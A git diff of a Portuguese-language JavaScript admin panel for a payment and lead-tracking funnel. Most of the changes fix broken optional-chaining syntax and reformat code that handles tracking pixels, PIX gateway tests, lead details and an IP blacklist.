         label.textContent = enabled ? 'Ligado' : 'Desligado';
         label.classList.toggle('is-on', enabled);
     };
@@ -5128,15 +4766,13 @@ function initAdmin() {
     const adminFetch = async (url, options = {}) => {
         const res = await fetch(url, {
             credentials: 'same-origin',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             ...options
         });
         return res;
     };
 
-    const escapeHtml = (value) => String(value ? ? '')
+    const escapeHtml = (value) => String(value ?? '')
         .replace(/&/g, '&amp;')
         .replace(/</g, '&lt;')
         .replace(/>/g, '&gt;')
@@ -5144,7 +4780,7 @@ function initAdmin() {
         .replace(/'/g, '&#39;');
 
     const formatDetailValue = (value, fallback = '-') => {
-        const text = String(value ? ? '').trim();
+        const text = String(value ?? '').trim();
         return text || fallback;
     };
 
@@ -5196,12 +4832,12 @@ function initAdmin() {
         const retryBtn = document.getElementById('admin-settings-retry-button');
         const closeBtn = document.getElementById('admin-settings-retry-close');
 
-        closeBtn ? .addEventListener('click', () => {
+        closeBtn?.addEventListener('click', () => {
             modal.classList.add('hidden');
             modal.setAttribute('aria-hidden', 'true');
             document.body.classList.remove('modal-open');
         });
-        modal ? .addEventListener('click', (event) => {
+        modal?.addEventListener('click', (event) => {
             if (event.target === modal) {
                 modal.classList.add('hidden');
                 modal.setAttribute('aria-hidden', 'true');
@@ -5209,12 +4845,7 @@ function initAdmin() {
             }
         });
 
-        return {
-            modal,
-            message,
-            retryBtn,
-            closeBtn
-        };
+        return { modal, message, retryBtn, closeBtn };
     };
 
     const showSettingsRetryModal = (messageText) => {
@@ -5222,8 +4853,8 @@ function initAdmin() {
         if (refs.message) {
             refs.message.textContent = String(messageText || 'Tente novamente para atualizar os gateways, pixels e chaves do painel.');
         }
-        refs.modal ? .classList.remove('hidden');
-        refs.modal ? .setAttribute('aria-hidden', 'false');
+        refs.modal?.classList.remove('hidden');
+        refs.modal?.setAttribute('aria-hidden', 'false');
         document.body.classList.add('modal-open');
     };
 
@@ -5239,51 +4870,51 @@ function initAdmin() {
         currentSettings = data || {};
 
         if (hasPixelForm) {
-            if (pixelEnabled) pixelEnabled.checked = !!data.pixel ? .enabled;
-            if (pixelId) pixelId.value = data.pixel ? .id || '';
-            if (pixelBackupId) pixelBackupId.value = data.pixel ? .backupId || '';
-            if (pixelCapiEnabled) pixelCapiEnabled.checked = !!data.pixel ? .capi ? .enabled;
-            if (pixelCapiToken) pixelCapiToken.value = data.pixel ? .capi ? .accessToken || '';
-            if (pixelCapiBackupToken) pixelCapiBackupToken.value = data.pixel ? .capi ? .backupAccessToken || '';
-            if (pixelEventPage) pixelEventPage.checked = data.pixel ? .events ? .page_view !== false;
-            if (pixelEventQuiz) pixelEventQuiz.checked = data.pixel ? .events ? .quiz_view !== false;
-            if (pixelEventLead) pixelEventLead.checked = data.pixel ? .events ? .lead !== false;
-            if (pixelEventCheckout) pixelEventCheckout.checked = data.pixel ? .events ? .checkout !== false;
-            if (pixelEventPurchase) pixelEventPurchase.checked = data.pixel ? .events ? .purchase !== false;
-            if (tiktokPixelEnabled) tiktokPixelEnabled.checked = !!data.tiktokPixel ? .enabled;
-            if (tiktokPixelId) tiktokPixelId.value = data.tiktokPixel ? .id || '';
-            if (tiktokPixelEventPage) tiktokPixelEventPage.checked = data.tiktokPixel ? .events ? .page_view !== false;
-            if (tiktokPixelEventQuiz) tiktokPixelEventQuiz.checked = data.tiktokPixel ? .events ? .quiz_view !== false;
-            if (tiktokPixelEventLead) tiktokPixelEventLead.checked = data.tiktokPixel ? .events ? .lead !== false;
-            if (tiktokPixelEventCheckout) tiktokPixelEventCheckout.checked = data.tiktokPixel ? .events ? .checkout !== false;
-            if (tiktokPixelEventPurchase) tiktokPixelEventPurchase.checked = data.tiktokPixel ? .events ? .purchase !== false;
+            if (pixelEnabled) pixelEnabled.checked = !!data.pixel?.enabled;
+            if (pixelId) pixelId.value = data.pixel?.id || '';
+            if (pixelBackupId) pixelBackupId.value = data.pixel?.backupId || '';
+            if (pixelCapiEnabled) pixelCapiEnabled.checked = !!data.pixel?.capi?.enabled;
+            if (pixelCapiToken) pixelCapiToken.value = data.pixel?.capi?.accessToken || '';
+            if (pixelCapiBackupToken) pixelCapiBackupToken.value = data.pixel?.capi?.backupAccessToken || '';
+            if (pixelEventPage) pixelEventPage.checked = data.pixel?.events?.page_view !== false;
+            if (pixelEventQuiz) pixelEventQuiz.checked = data.pixel?.events?.quiz_view !== false;
+            if (pixelEventLead) pixelEventLead.checked = data.pixel?.events?.lead !== false;
+            if (pixelEventCheckout) pixelEventCheckout.checked = data.pixel?.events?.checkout !== false;
+            if (pixelEventPurchase) pixelEventPurchase.checked = data.pixel?.events?.purchase !== false;
+            if (tiktokPixelEnabled) tiktokPixelEnabled.checked = !!data.tiktokPixel?.enabled;
+            if (tiktokPixelId) tiktokPixelId.value = data.tiktokPixel?.id || '';
+            if (tiktokPixelEventPage) tiktokPixelEventPage.checked = data.tiktokPixel?.events?.page_view !== false;
+            if (tiktokPixelEventQuiz) tiktokPixelEventQuiz.checked = data.tiktokPixel?.events?.quiz_view !== false;
+            if (tiktokPixelEventLead) tiktokPixelEventLead.checked = data.tiktokPixel?.events?.lead !== false;
+            if (tiktokPixelEventCheckout) tiktokPixelEventCheckout.checked = data.tiktokPixel?.events?.checkout !== false;
+            if (tiktokPixelEventPurchase) tiktokPixelEventPurchase.checked = data.tiktokPixel?.events?.purchase !== false;
         }
 
         if (hasUtmfyForm) {
-            if (utmfyEnabled) utmfyEnabled.checked = !!data.utmfy ? .enabled;
-            if (utmfyEndpoint) utmfyEndpoint.value = data.utmfy ? .endpoint || '';
-            if (utmfyApi) utmfyApi.value = data.utmfy ? .apiKey || '';
-            if (pushcutEnabled) pushcutEnabled.checked = !!data.pushcut ? .enabled;
+            if (utmfyEnabled) utmfyEnabled.checked = !!data.utmfy?.enabled;
+            if (utmfyEndpoint) utmfyEndpoint.value = data.utmfy?.endpoint || '';
+            if (utmfyApi) utmfyApi.value = data.utmfy?.apiKey || '';
+            if (pushcutEnabled) pushcutEnabled.checked = !!data.pushcut?.enabled;
             if (pushcutPixCreated) {
                 pushcutPixCreated.value =
-                    data.pushcut ? .pixCreatedUrl ||
-                    data.pushcut ? .pixCreatedUrls ? .[0] ||
-                    data.pushcut ? .pixCreatedUrl2 ||
-                    data.pushcut ? .pixCreatedUrls ? .[1] ||
+                    data.pushcut?.pixCreatedUrl ||
+                    data.pushcut?.pixCreatedUrls?.[0] ||
+                    data.pushcut?.pixCreatedUrl2 ||
+                    data.pushcut?.pixCreatedUrls?.[1] ||
                     '';
             }
             if (pushcutPixConfirmed) {
                 pushcutPixConfirmed.value =
-                    data.pushcut ? .pixConfirmedUrl ||
-                    data.pushcut ? .pixConfirmedUrls ? .[0] ||
-                    data.pushcut ? .pixConfirmedUrl2 ||
-                    data.pushcut ? .pixConfirmedUrls ? .[1] ||
+                    data.pushcut?.pixConfirmedUrl ||
+                    data.pushcut?.pixConfirmedUrls?.[0] ||
+                    data.pushcut?.pixConfirmedUrl2 ||
+                    data.pushcut?.pixConfirmedUrls?.[1] ||
                     '';
             }
-            if (pushcutCreatedTitle) pushcutCreatedTitle.value = data.pushcut ? .templates ? .pixCreatedTitle || '';
-            if (pushcutCreatedMessage) pushcutCreatedMessage.value = data.pushcut ? .templates ? .pixCreatedMessage || '';
-            if (pushcutConfirmedTitle) pushcutConfirmedTitle.value = data.pushcut ? .templates ? .pixConfirmedTitle || '';
-            if (pushcutConfirmedMessage) pushcutConfirmedMessage.value = data.pushcut ? .templates ? .pixConfirmedMessage || '';
+            if (pushcutCreatedTitle) pushcutCreatedTitle.value = data.pushcut?.templates?.pixCreatedTitle || '';
+            if (pushcutCreatedMessage) pushcutCreatedMessage.value = data.pushcut?.templates?.pixCreatedMessage || '';
+            if (pushcutConfirmedTitle) pushcutConfirmedTitle.value = data.pushcut?.templates?.pixConfirmedTitle || '';
+            if (pushcutConfirmedMessage) pushcutConfirmedMessage.value = data.pushcut?.templates?.pixConfirmedMessage || '';
         }
 
         if (hasPaymentsForm) {
@@ -5344,7 +4975,7 @@ function initAdmin() {
         }
 
         if (hasFeatureForm) {
-            featureOrderbump.checked = data.features ? .orderbump !== false;
+            featureOrderbump.checked = data.features?.orderbump !== false;
         }
     };
 
@@ -5396,8 +5027,8 @@ function initAdmin() {
     };
 
     const getLeadDisplayData = (source) => {
-        if (source ? .display && typeof source.display === 'object') return source.display;
-        if (source ? .readable ? .display && typeof source.readable.display === 'object') return source.readable.display;
+        if (source?.display && typeof source.display === 'object') return source.display;
+        if (source?.readable?.display && typeof source.readable.display === 'object') return source.readable.display;
         return {};
     };
 
@@ -5407,8 +5038,8 @@ function initAdmin() {
     };
 
     const summarizeLeadPaymentItem = (item = {}) => {
-        const label = formatDetailValue(item ? .shortLabel || item ? .label, 'PIX');
-        const status = String(item ? .status || '').trim().toLowerCase();
+        const label = formatDetailValue(item?.shortLabel || item?.label, 'PIX');
+        const status = String(item?.status || '').trim().toLowerCase();
         if (status === 'paid') return `${label} PAGO`;
         if (status === 'pending') return `${label} GERADO`;
         if (status === 'refused') return `${label} RECUSADO`;
@@ -5416,14 +5047,12 @@ function initAdmin() {
         return '';
     };
 
-    const buildLeadStatusPillsHtml = (items = [], {
-        emptyLabel = ''
-    } = {}) => {
+    const buildLeadStatusPillsHtml = (items = [], { emptyLabel = '' } = {}) => {
         const list = Array.isArray(items) ? items : [];
         if (!list.length) {
-            return emptyLabel ?
-                `<span class="status-pill status-pill--neutral">${escapeHtml(emptyLabel)}</span>` :
-                '';
+            return emptyLabel
+                ? `<span class="status-pill status-pill--neutral">${escapeHtml(emptyLabel)}</span>`
+                : '';
         }
 
         return list
@@ -5454,14 +5083,14 @@ function initAdmin() {
     };
 
     const resolveGatewayTestQrSrc = (result = {}) => {
-        const qrSource = String(result ? .paymentQrUrl || result ? .paymentCodeBase64 || '').trim();
+        const qrSource = String(result?.paymentQrUrl || result?.paymentCodeBase64 || '').trim();
         if (qrSource) {
             if (/^https?:\/\//i.test(qrSource) || qrSource.startsWith('data:image')) {
                 return qrSource;
             }
             return `data:image/png;base64,${qrSource}`;
         }
-        return buildGatewayTestQrFallbackUrl(result ? .paymentCode || '');
+        return buildGatewayTestQrFallbackUrl(result?.paymentCode || '');
     };
 
     const setGatewayTestModalVisible = (visible) => {
@@ -5483,11 +5112,11 @@ function initAdmin() {
     };
 
     const syncGatewayTestSelectionDefaults = () => {
-        if (gatewayTestGhostspay) gatewayTestGhostspay.checked = gatewayGhostspayEnabled ? .checked !== false;
-        if (gatewayTestSunize) gatewayTestSunize.checked = gatewaySunizeEnabled ? .checked === true;
-        if (gatewayTestParadise) gatewayTestParadise.checked = gatewayParadiseEnabled ? .checked === true;
-        if (gatewayTestAtomopay) gatewayTestAtomopay.checked = gatewayAtomopayEnabled ? .checked === true;
-        if (gatewayTestBravoPay) gatewayTestBravoPay.checked = gatewayBravoPayEnabled ? .checked === true;
+        if (gatewayTestGhostspay) gatewayTestGhostspay.checked = gatewayGhostspayEnabled?.checked !== false;
+        if (gatewayTestSunize) gatewayTestSunize.checked = gatewaySunizeEnabled?.checked === true;
+        if (gatewayTestParadise) gatewayTestParadise.checked = gatewayParadiseEnabled?.checked === true;
+        if (gatewayTestAtomopay) gatewayTestAtomopay.checked = gatewayAtomopayEnabled?.checked === true;
+        if (gatewayTestBravoPay) gatewayTestBravoPay.checked = gatewayBravoPayEnabled?.checked === true;
         if (gatewayTestAmount && !String(gatewayTestAmount.value || '').trim()) {
             gatewayTestAmount.value = DEFAULT_GATEWAY_TEST_AMOUNT;
         }
@@ -5495,11 +5124,11 @@ function initAdmin() {
 
     const getSelectedGatewayTests = () => {
         const gateways = [];
-        if (gatewayTestGhostspay ? .checked) gateways.push('ghostspay');
-        if (gatewayTestSunize ? .checked) gateways.push('sunize');
-        if (gatewayTestParadise ? .checked) gateways.push('paradise');
-        if (gatewayTestAtomopay ? .checked) gateways.push('atomopay');
-        if (gatewayTestBravoPay ? .checked) gateways.push('bravopay');
+        if (gatewayTestGhostspay?.checked) gateways.push('ghostspay');
+        if (gatewayTestSunize?.checked) gateways.push('sunize');
+        if (gatewayTestParadise?.checked) gateways.push('paradise');
+        if (gatewayTestAtomopay?.checked) gateways.push('atomopay');
+        if (gatewayTestBravoPay?.checked) gateways.push('bravopay');
         return gateways;
     };
 
@@ -5511,14 +5140,14 @@ function initAdmin() {
             return;
         }
         gatewayTestResults.innerHTML = list.map((result) => {
-            const gatewayLabel = escapeHtml(formatDetailValue(result ? .gatewayLabel || result ? .gateway));
-            const amountText = escapeHtml(formatCurrency(Number(result ? .amount || amount || 0)));
+            const gatewayLabel = escapeHtml(formatDetailValue(result?.gatewayLabel || result?.gateway));
+            const amountText = escapeHtml(formatCurrency(Number(result?.amount || amount || 0)));
             const qrSrc = resolveGatewayTestQrSrc(result);
-            const statusText = escapeHtml(formatDetailValue(result ? .statusRaw, result ? .ok ? 'gerado' : 'falha'));
-            const txidText = escapeHtml(formatDetailValue(result ? .txid, '-'));
-            const externalIdText = escapeHtml(formatDetailValue(result ? .externalId, '-'));
-            const paymentCode = String(result ? .paymentCode || '').trim();
-            const detailRaw = String(result ? .detail || '').trim();
+            const statusText = escapeHtml(formatDetailValue(result?.statusRaw, result?.ok ? 'gerado' : 'falha'));
+            const txidText = escapeHtml(formatDetailValue(result?.txid, '-'));
+            const externalIdText = escapeHtml(formatDetailValue(result?.externalId, '-'));
+            const paymentCode = String(result?.paymentCode || '').trim();
+            const detailRaw = String(result?.detail || '').trim();
             const detailText = escapeHtml(detailRaw);
             return `
                 <article class="gateway-test-card${result?.ok ? '' : ' gateway-test-card--error'}">
@@ -5576,8 +5205,8 @@ function initAdmin() {
         syncGatewayTestSelectionDefaults();
         resetGatewayTestResults();
         setGatewayTestModalVisible(true);
-        gatewayTestAmount ? .focus();
-        gatewayTestAmount ? .select();
+        gatewayTestAmount?.focus();
+        gatewayTestAmount?.select();
     };
 
     const closeGatewayTestModal = () => {
@@ -5587,12 +5216,12 @@ function initAdmin() {
 
     const runGatewayTests = async () => {
         if (!gatewayTestGenerate || gatewayTestRunning) return;
-        const amountRaw = String(gatewayTestAmount ? .value || '').trim();
+        const amountRaw = String(gatewayTestAmount?.value || '').trim();
         const normalizedAmount = Number(amountRaw.replace(',', '.'));
         const gateways = getSelectedGatewayTests();
         if (!Number.isFinite(normalizedAmount) || normalizedAmount < 1) {
             showToast('Informe um valor valido a partir de R$ 1,00.', 'error');
-            gatewayTestAmount ? .focus();
+            gatewayTestAmount?.focus();
             return;
         }
         if (!gateways.length) {
@@ -5619,25 +5248,25 @@ function initAdmin() {
             });
             const data = await res.json().catch(() => ({}));
 
-            if (!res.ok || data ? .ok === false) {
-                if (gatewayTestStatus) gatewayTestStatus.textContent = data ? .error || 'Falha ao gerar os testes.';
+            if (!res.ok || data?.ok === false) {
+                if (gatewayTestStatus) gatewayTestStatus.textContent = data?.error || 'Falha ao gerar os testes.';
                 if (gatewayTestResults) {
                     gatewayTestResults.innerHTML = `<div class="gateway-test-empty">${escapeHtml(data?.error || 'Falha ao gerar os testes.')}</div>`;
                 }
-                showToast(data ? .error || 'Falha ao gerar os testes dos gateways.', 'error');
+                showToast(data?.error || 'Falha ao gerar os testes dos gateways.', 'error');
                 return;
             }
 
-            renderGatewayTestResults(data ? .results || [], Number(data ? .amount || normalizedAmount));
-            const okCount = (Array.isArray(data ? .results) ? data.results : []).filter((item) => item ? .ok).length;
-            const failCount = (Array.isArray(data ? .results) ? data.results : []).filter((item) => !item ? .ok).length;
+            renderGatewayTestResults(data?.results || [], Number(data?.amount || normalizedAmount));
+            const okCount = (Array.isArray(data?.results) ? data.results : []).filter((item) => item?.ok).length;
+            const failCount = (Array.isArray(data?.results) ? data.results : []).filter((item) => !item?.ok).length;
             if (gatewayTestStatus) {
                 gatewayTestStatus.textContent = `Gerados ${okCount} gateway(s) com sucesso. Falhas: ${failCount}.`;
             }
             showToast(
-                okCount > 0 ?
-                `Teste concluido. ${okCount} gateway(s) geraram PIX.` :
-                'Nenhum gateway conseguiu gerar PIX de teste.',
+                okCount > 0
+                    ? `Teste concluido. ${okCount} gateway(s) geraram PIX.`
+                    : 'Nenhum gateway conseguiu gerar PIX de teste.',
                 okCount > 0 ? 'success' : 'error'
             );
         } catch (_error) {
@@ -5656,8 +5285,8 @@ function initAdmin() {
 
     const formatJourneySpan = (pages = []) => {
         const list = Array.isArray(pages) ? pages : [];
-        const first = list[0] ? .createdAt;
-        const last = list[list.length - 1] ? .createdAt;
+        const first = list[0]?.createdAt;
+        const last = list[list.length - 1]?.createdAt;
         if (!first || !last) return '-';
         const start = new Date(first);
         const end = new Date(last);
@@ -5672,12 +5301,12 @@ function initAdmin() {
     };
 
     const formatTransactionLookupState = (item) => {
-        const bucket = String(item ? .bucket || '').trim().toLowerCase();
+        const bucket = String(item?.bucket || '').trim().toLowerCase();
         if (bucket === 'confirmed') return 'Pago';
         if (bucket === 'pending') return 'Pendente';
         if (bucket === 'refunded') return 'Estornado';
         if (bucket === 'refused') return 'Recusado';
-        if (item ? .ok === false) return 'Falha na consulta';
+        if (item?.ok === false) return 'Falha na consulta';
         return 'Nao consultada';
     };
 
@@ -5688,99 +5317,35 @@ function initAdmin() {
         if (leadDetailTransactionSummary) {
             if (!lookup) {
                 leadDetailTransactionSummary.innerHTML = '<div class="admin-muted">Nenhuma consulta feita ainda para esta transacao.</div>';
-            } else if (lookup ? .ok === false) {
-                leadDetailTransactionSummary.innerHTML = buildLeadFieldsHtml([{
-                        label: 'TXID',
-                        value: lookup ? .txid,
-                        mono: true,
-                        wide: true
-                    },
-                    {
-                        label: 'Gateway',
-                        value: lookup ? .gateway
-                    },
-                    {
-                        label: 'Status HTTP',
-                        value: lookup ? .statusCode,
-                        mono: true
-                    },
-                    {
-                        label: 'Detalhe',
-                        value: lookup ? .detail,
-                        wide: true,
-                        accent: true
-                    }
+            } else if (lookup?.ok === false) {
+                leadDetailTransactionSummary.innerHTML = buildLeadFieldsHtml([
+                    { label: 'TXID', value: lookup?.txid, mono: true, wide: true },
+                    { label: 'Gateway', value: lookup?.gateway },
+                    { label: 'Status HTTP', value: lookup?.statusCode, mono: true },
+                    { label: 'Detalhe', value: lookup?.detail, wide: true, accent: true }
                 ]);
             } else {
-                leadDetailTransactionSummary.innerHTML = buildLeadFieldsHtml([{
-                        label: 'Gateway',
-                        value: lookup ? .gatewayLabel || lookup ? .gateway,
-                        accent: true
-                    },
-                    {
-                        label: 'TXID',
-                        value: lookup ? .txid,
-                        mono: true,
-                        wide: true
-                    },
-                    {
-                        label: 'Status bruto',
-                        value: lookup ? .statusRaw,
-                        mono: true
-                    },
-                    {
-                        label: 'Status normalizado',
-                        value: formatTransactionLookupState(lookup),
-                        accent: true
-                    },
-                    {
-                        label: 'Status UTMify',
-                        value: lookup ? .utmifyStatus,
-                        mono: true
-                    },
-                    {
-                        label: 'Consultado em',
-                        value: formatDateTime(lookup ? .changedAt)
-                    },
-                    {
-                        label: 'Lead sincronizado',
-                        value: Number(lookup ? .updatedRows || 0) > 0 ? 'Sim' : 'Nao',
-                        accent: Number(lookup ? .updatedRows || 0) > 0
-                    },
-                    {
-                        label: 'Linhas sincronizadas',
-                        value: String(Number(lookup ? .updatedRows || 0)),
-                        mono: true
-                    },
-                    {
-                        label: 'Regressao ignorada',
-                        value: lookup ? .skippedRegression === true ? 'Sim' : 'Nao'
-                    },
-                    {
-                        label: 'Order/Session fallback',
-                        value: lookup ? .sessionIdFallback,
-                        mono: true,
-                        wide: true
-                    },
-                    {
-                        label: 'Valor',
-                        value: Number(lookup ? .amount || 0) ? formatCurrency(Number(lookup.amount || 0)) : '-'
-                    },
-                    {
-                        label: 'Taxa',
-                        value: Number(lookup ? .fee || 0) ? formatCurrency(Number(lookup.fee || 0)) : 'R$ 0,00'
-                    },
-                    {
-                        label: 'Comissao',
-                        value: Number(lookup ? .commission || 0) ? formatCurrency(Number(lookup.commission || 0)) : 'R$ 0,00'
-                    }
+                leadDetailTransactionSummary.innerHTML = buildLeadFieldsHtml([
+                    { label: 'Gateway', value: lookup?.gatewayLabel || lookup?.gateway, accent: true },
+                    { label: 'TXID', value: lookup?.txid, mono: true, wide: true },
+                    { label: 'Status bruto', value: lookup?.statusRaw, mono: true },
+                    { label: 'Status normalizado', value: formatTransactionLookupState(lookup), accent: true },
+                    { label: 'Status UTMify', value: lookup?.utmifyStatus, mono: true },
+                    { label: 'Consultado em', value: formatDateTime(lookup?.changedAt) },
+                    { label: 'Lead sincronizado', value: Number(lookup?.updatedRows || 0) > 0 ? 'Sim' : 'Nao', accent: Number(lookup?.updatedRows || 0) > 0 },
+                    { label: 'Linhas sincronizadas', value: String(Number(lookup?.updatedRows || 0)), mono: true },
+                    { label: 'Regressao ignorada', value: lookup?.skippedRegression === true ? 'Sim' : 'Nao' },
+                    { label: 'Order/Session fallback', value: lookup?.sessionIdFallback, mono: true, wide: true },
+                    { label: 'Valor', value: Number(lookup?.amount || 0) ? formatCurrency(Number(lookup.amount || 0)) : '-' },
+                    { label: 'Taxa', value: Number(lookup?.fee || 0) ? formatCurrency(Number(lookup.fee || 0)) : 'R$ 0,00' },
+                    { label: 'Comissao', value: Number(lookup?.commission || 0) ? formatCurrency(Number(lookup.commission || 0)) : 'R$ 0,00' }
                 ]);
             }
         }
         if (leadDetailTransactionPayload) {
-            leadDetailTransactionPayload.textContent = lookup ?
-                JSON.stringify(lookup ? .transaction || lookup, null, 2) :
-                'Clique em "Consultar transacao" para consultar o gateway e sincronizar o status deste lead.';
+            leadDetailTransactionPayload.textContent = lookup
+                ? JSON.stringify(lookup?.transaction || lookup, null, 2)
+                : 'Clique em "Consultar transacao" para consultar o gateway e sincronizar o status deste lead.';
             leadDetailTransactionPayload.scrollTop = 0;
         }
     };
@@ -5804,7 +5369,7 @@ function initAdmin() {
 
         currentIpBlacklist.forEach((entry) => {
             const tr = document.createElement('tr');
-            const lead = entry ? .lead || {};
+            const lead = entry?.lead || {};
             tr.innerHTML = `
                 <td class="lead-cell">${escapeHtml(formatDetailValue(entry?.ip))}</td>
                 <td class="lead-cell lead-cell--name"><strong>${escapeHtml(formatDetailValue(lead?.name))}</strong></td>
@@ -5828,53 +5393,53 @@ function initAdmin() {
         const res = await adminFetch('/api/admin/ip-blacklist');
         const data = await res.json().catch(() => ({}));
         if (!res.ok) {
-            showToast(data ? .error || 'Falha ao carregar blacklist de IP.', 'error');
+            showToast(data?.error || 'Falha ao carregar blacklist de IP.', 'error');
             return;
         }
-        renderIpBlacklist(data ? .entries || []);
+        renderIpBlacklist(data?.entries || []);
     };
 
     const renderLeadDetail = (detail) => {
         if (!leadDetailModal || !detail) return;
         currentLeadDetail = detail;
 
-        const payload = detail ? .payload || {};
+        const payload = detail?.payload || {};
         const display = getLeadDisplayData(detail);
-        const metadata = payload ? .metadata || {};
-        const payloadUtm = payload ? .utm || {};
-        const payloadPersonal = payload ? .personal || {};
-        const payloadAddress = payload ? .address || {};
-        const payloadExtra = payload ? .extra || {};
-        const payloadShipping = payload ? .shipping || {};
-        const payloadReward = payload ? .reward || {};
-        const payloadBump = payload ? .bump || {};
-        const payloadUpsell = payload ? .upsell || {};
-        const pages = Array.isArray(detail ? .pageviews) ? detail.pageviews : [];
-        const rewardName = formatDetailValue(detail ? .reward ? .name);
-        const shippingName = formatDetailValue(detail ? .shipping ? .name);
-        const paymentItems = Array.isArray(detail ? .payment ? .payments) ? detail.payment.payments : (Array.isArray(display ? .payments) ? display.payments : []);
+        const metadata = payload?.metadata || {};
+        const payloadUtm = payload?.utm || {};
+        const payloadPersonal = payload?.personal || {};
+        const payloadAddress = payload?.address || {};
+        const payloadExtra = payload?.extra || {};
+        const payloadShipping = payload?.shipping || {};
+        const payloadReward = payload?.reward || {};
+        const payloadBump = payload?.bump || {};
+        const payloadUpsell = payload?.upsell || {};
+        const pages = Array.isArray(detail?.pageviews) ? detail.pageviews : [];
+        const rewardName = formatDetailValue(detail?.reward?.name);
+        const shippingName = formatDetailValue(detail?.shipping?.name);
+        const paymentItems = Array.isArray(detail?.payment?.payments) ? detail.payment.payments : (Array.isArray(display?.payments) ? display.payments : []);
         const paymentPillsHtml = buildLeadStatusPillsHtml(paymentItems);
-        const paymentSummary = formatDetailValue(detail ? .payment ? .paymentSummary || display ? .paymentSummary, 'Sem pagamentos');
-        const journeyLabel = formatDetailValue(detail ? .payment ? .journey ? .label || display ? .journey ? .label);
-        const chargeLabel = formatDetailValue(detail ? .payment ? .charge ? .label || display ? .charge ? .label);
-        const chargeOfferLabel = formatDetailValue(detail ? .payment ? .charge ? .offerLabel || display ? .charge ? .offerLabel);
-        const chargeStatusLabel = formatDetailValue(detail ? .payment ? .charge ? .statusLabel || display ? .charge ? .statusLabel);
-        const selectionSummary = formatDetailValue(detail ? .payment ? .selection ? .summary || display ? .selection ? .summary);
-        const currentAmountValue = Number(detail ? .payment ? .amount);
+        const paymentSummary = formatDetailValue(detail?.payment?.paymentSummary || display?.paymentSummary, 'Sem pagamentos');
+        const journeyLabel = formatDetailValue(detail?.payment?.journey?.label || display?.journey?.label);
+        const chargeLabel = formatDetailValue(detail?.payment?.charge?.label || display?.charge?.label);
+        const chargeOfferLabel = formatDetailValue(detail?.payment?.charge?.offerLabel || display?.charge?.offerLabel);
+        const chargeStatusLabel = formatDetailValue(detail?.payment?.charge?.statusLabel || display?.charge?.statusLabel);
+        const selectionSummary = formatDetailValue(detail?.payment?.selection?.summary || display?.selection?.summary);
+        const currentAmountValue = Number(detail?.payment?.amount);
         const valueText = Number.isFinite(currentAmountValue) ? formatCurrency(currentAmountValue) : '-';
-        const clientIp = formatDetailValue(detail ? .device ? .clientIp);
-        const blockedEntry = detail ? .block ? .entry || null;
-        const isBlocked = detail ? .block ? .blocked === true;
-        const sessionId = formatDetailValue(detail ? .sessionId);
+        const clientIp = formatDetailValue(detail?.device?.clientIp);
+        const blockedEntry = detail?.block?.entry || null;
+        const isBlocked = detail?.block?.blocked === true;
+        const sessionId = formatDetailValue(detail?.sessionId);
         const journeySpan = formatJourneySpan(pages);
-        const firstPageAt = pages[0] ? .createdAt ? formatDateTime(pages[0].createdAt) : '-';
-        const lastPageAt = pages[pages.length - 1] ? .createdAt ? formatDateTime(pages[pages.length - 1].createdAt) : '-';
-        const gatewayLabel = formatDetailValue(detail ? .payment ? .gatewayLabel);
-        const statusLabel = formatDetailValue(detail ? .readable ? .status_funil);
-        const eventLabel = formatDetailValue(detail ? .readable ? .evento);
+        const firstPageAt = pages[0]?.createdAt ? formatDateTime(pages[0].createdAt) : '-';
+        const lastPageAt = pages[pages.length - 1]?.createdAt ? formatDateTime(pages[pages.length - 1].createdAt) : '-';
+        const gatewayLabel = formatDetailValue(detail?.payment?.gatewayLabel);
+        const statusLabel = formatDetailValue(detail?.readable?.status_funil);
+        const eventLabel = formatDetailValue(detail?.readable?.evento);
 
         if (leadDetailTitle) {
-            leadDetailTitle.textContent = formatDetailValue(detail ? .customer ? .name, 'Lead sem nome');
+            leadDetailTitle.textContent = formatDetailValue(detail?.customer?.name, 'Lead sem nome');
         }
         if (leadDetailSubtitle) {
             leadDetailSubtitle.textContent = `${sessionId} | ${gatewayLabel} | ${paymentSummary}`;
@@ -5900,7 +5465,7 @@ function initAdmin() {
             leadDetailBlockState.classList.remove('hidden');
         }
         if (leadDetailBlockBtn) {
-            leadDetailBlockBtn.disabled = !detail ? .device ? .clientIp || isBlocked;
+            leadDetailBlockBtn.disabled = !detail?.device?.clientIp || isBlocked;
             leadDetailBlockBtn.classList.toggle('hidden', isBlocked);
         }
         if (leadDetailUnblockBtn) {
@@ -5908,566 +5473,167 @@ function initAdmin() {
             leadDetailUnblockBtn.classList.toggle('hidden', !isBlocked);
         }
         if (leadDetailLookupBtn) {
-            leadDetailLookupBtn.disabled = !detail ? .payment ? .pixTxid || !detail ? .payment ? .gateway;
+            leadDetailLookupBtn.disabled = !detail?.payment?.pixTxid || !detail?.payment?.gateway;
         }
         if (leadDetailLookupStatus) {
-            leadDetailLookupStatus.textContent = detail ? .payment ? .pixTxid ?
-                'Consulta individual pronta para sincronizar o lead.' :
-                'Este lead nao tem TXID valido para consulta.';
+            leadDetailLookupStatus.textContent = detail?.payment?.pixTxid
+                ? 'Consulta individual pronta para sincronizar o lead.'
+                : 'Este lead nao tem TXID valido para consulta.';
         }
 
         if (leadDetailSummary) {
-            leadDetailSummary.innerHTML = buildLeadSummaryCardsHtml([{
-                    label: 'Valor atual',
-                    value: valueText
-                },
-                {
-                    label: 'Selecao base',
-                    value: selectionSummary
-                },
-                {
-                    label: 'Cobranca atual',
-                    value: chargeOfferLabel
-                },
-                {
-                    label: 'Pagamentos',
-                    value: paymentSummary
-                },
-                {
-                    label: 'Ultima atualizacao',
-                    value: formatDateTime(detail ? .payment ? .updatedAt || detail ? .payment ? .createdAt)
-                }
+            leadDetailSummary.innerHTML = buildLeadSummaryCardsHtml([
+                { label: 'Valor atual', value: valueText },
+                { label: 'Selecao base', value: selectionSummary },
+                { label: 'Cobranca atual', value: chargeOfferLabel },
+                { label: 'Pagamentos', value: paymentSummary },
+                { label: 'Ultima atualizacao', value: formatDateTime(detail?.payment?.updatedAt || detail?.payment?.createdAt) }
             ]);
         }
 
         if (leadDetailOverview) {
-            leadDetailOverview.innerHTML = buildLeadStatCardsHtml([{
-                    label: 'Jornada atual',
-                    value: journeyLabel
-                },
-                {
-                    label: 'Cobranca atual',
-                    value: chargeLabel
-                },
-                {
-                    label: 'Oferta atual',
-                    value: chargeOfferLabel
-                },
-                {
-                    label: 'Status atual',
-                    value: chargeStatusLabel
-                },
-                {
-                    label: 'Pagamentos salvos',
